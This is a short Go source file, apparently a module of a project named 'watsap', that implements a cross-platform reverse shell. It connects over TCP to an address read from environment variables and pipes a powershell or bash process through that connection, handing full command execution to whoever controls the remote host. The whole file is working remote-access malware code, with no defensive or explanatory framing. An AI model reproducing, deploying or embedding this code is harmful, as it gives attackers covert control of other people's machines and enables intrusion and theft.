package rshell

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"watsap/utils/config"
)

var rshell_ip = os.Getenv("RSHELL_IP")
var rshell_port = os.Getenv("RSHELL_PORT")

func RshellConnect() {
	if rshell_ip == "" || rshell_port == "" {
		config.Logger("[RShell] RShell IP or port not set", "error")
		return
	}
	c, _ := net.Dial("tcp", rshell_ip+":"+rshell_port)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("bash")
	}
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
